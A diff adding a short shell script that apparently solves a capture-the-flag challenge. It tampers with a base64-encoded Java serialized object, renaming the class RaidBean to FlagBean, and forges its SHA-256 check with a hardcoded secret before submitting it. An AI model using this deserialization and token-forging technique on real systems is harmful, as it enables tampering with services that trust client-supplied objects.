@@ -1,0 +1,5 @@
+ENCODED="rO0ABXNyAA9jb2ZmZWUuUmFpZEJlYW4AAAAAAAAAAQIAAHhyAAtjb2ZmZWUuQmVhbgAAAAAAAAABAgAETAAHaW5oZXJpdHQADUxjb2ZmZWUvQmVhbjtMAARuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAHcGFyZW50MXEAfgACTAAHcGFyZW50MnEAfgACeHBwdAAEUmFpZHBw"
+FLAG=$(echo -n $ENCODED | base64 -d | sed 's/Raid/Flag/g' | base64 -w 0)
+./jde.sh $FLAG
+SHA256=$(echo $FLAG"c@ram31m4cchi@o" | hashalot -q -x sha256)
+echo $FLAG-$SHA256
